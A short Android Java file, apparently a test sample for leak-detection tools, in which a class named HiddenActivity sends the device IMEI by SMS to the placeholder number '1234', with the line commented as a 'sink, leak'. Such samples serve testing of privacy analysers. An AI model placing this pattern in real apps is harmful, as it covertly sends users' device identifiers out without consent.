package com.privateActivity;

import android.telephony.SmsManager;

/**
 * Created by dewan on 1/27/18.
 */

public class HiddenActivity{
    public void LeakImei(String imei)
    {

        SmsManager sms = SmsManager.getDefault();
        sms.sendTextMessage("1234", null, imei, null, null);  //sink, leak


    }
}
